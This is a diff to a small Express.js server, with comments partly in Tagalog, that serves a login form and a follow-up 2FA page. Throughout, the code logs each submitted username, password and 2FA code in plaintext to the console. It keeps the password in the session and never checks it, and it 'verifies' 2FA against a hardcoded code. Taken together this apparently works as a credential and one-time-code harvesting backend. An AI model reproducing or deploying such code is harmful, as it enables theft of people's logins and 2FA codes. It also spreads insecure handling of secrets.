@@ -1,93 +1,103 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const session = require('express-session');
+const Redis = require('ioredis');
 const RedisStore = require('connect-redis')(session);
-const redis = require('redis');
-const app = express();
-const PORT = 3000;
 
-// Set up Redis client
-const redisClient = redis.createClient({
-  host: 'localhost',  // Ipalit kung kinakailangan
-  port: 6379,  // Default Redis port
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+// Redis client connection
+const redisClient = new Redis({
+  host: 'localhost', // Palitan ito kung gumagamit ka ng Redis cloud service
+  port: 6379, // Default Redis port
+  password: '', // Kung may password sa Redis server mo
+});
+
+// Handle Redis connection
+redisClient.on('connect', () => {
+  console.log('Redis server connected!');
 });
 
 redisClient.on('error', (err) => {
-  console.error('Redis error:', err);
+  console.error('Redis connection error:', err);
 });
 
-// Middleware para mag-handle ng URL-encoded data
+// Middleware
 app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
 
-// Setup ng session middleware gamit ang Redis store
+// Session setup with Redis store
 app.use(session({
   store: new RedisStore({ client: redisClient }),
-  secret: 'your-secret-key',  // Palitan ito ng mas secure na key sa production
+  secret: 'your-secret-key', // Palitan ito ng tunay na secret key
   resave: false,
-  saveUninitialized: true,
-  cookie: { secure: false },  // Gamitin ito kung HTTPS ang iyong server sa production
+  saveUninitialized: false,
+  cookie: { secure: false } // Gamitin ang secure: true kung HTTPS ang gamit mo
 }));
 
-// Serve static files (CSS)
-app.use(express.static('public'));
-
-// Root route upang ipakita ang login form
+// Route to serve the login form
 app.get('/', (req, res) => {
   res.sendFile(__dirname + '/index.html');
 });
 
-// Route para mag-handle ng POST request mula sa login form
+// Route to handle login form submission
 app.post('/submit', (req, res) => {
-  const username = req.body.username;
-  const password = req.body.password;
+  const { username, password } = req.body;
 
-  // I-save ang username at password sa session
-  req.session.username = username;
-  req.session.password = password;
-
-  // I-log ang username at password
+  // Log the username and password
   console.log(`Username: ${username}`);
   console.log(`Password: ${password}`);
 
-  // Mag redirect sa 2FA page
+  // Save user info to session for later verification
+  req.session.username = username;
+  req.session.password = password;
+
+  // Redirect to 2FA verification page
   res.redirect('/verify-2fa');
 });
 
-// Route para sa 2FA page
+// Route to show the 2FA verification form
 app.get('/verify-2fa', (req, res) => {
-  if (!req.session.username || !req.session.password) {
+  if (!req.session.username) {
     return res.redirect('/');
   }
 
   res.send(`
-    <h2>2FA Verification</h2>
     <form action="/verify-2fa" method="POST">
-      <input type="number" name="auth-code" placeholder="Enter 2FA Code" required>
+      <input type="number" name="authCode" placeholder="Enter 2FA Code" required>
       <button type="submit">Verify</button>
     </form>
   `);
 });
 
-// Route para mag-handle ng POST request ng 2FA code
+// Route to handle 2FA verification
 app.post('/verify-2fa', (req, res) => {
-  const authCode = req.body['auth-code'];
-  const username = req.session.username;
-  const password = req.session.password;
+  const { authCode } = req.body;
+  const { username, password } = req.session;
 
-  // I-log ang username, password, at 2FA code
+  // Log the username, password, and 2FA code
   console.log(`Username: ${username}`);
   console.log(`Password: ${password}`);
   console.log(`2FA Code: ${authCode}`);
 
-  // Simulate 2FA validation (wala pang tunay na verification sa ngayon)
-  if (authCode) {
-    res.send('2FA Verified! You are logged in.');
+  // Here you can simulate a 2FA check (you can replace this with real logic)
+  if (authCode === '33444') {
+    res.send('2FA Verified Successfully!');
   } else {
-    res.send('Invalid 2FA Code!');
+    res.send('Invalid 2FA Code.');
   }
+
+  // Clear session after the verification
+  req.session.destroy((err) => {
+    if (err) {
+      return console.log('Error destroying session:', err);
+    }
+    console.log('Session destroyed.');
+  });
 });
 
-// Simulan ang server sa port 3000
+// Start the server
 app.listen(PORT, () => {
   console.log(`Server is running at http://localhost:${PORT}`);
 });
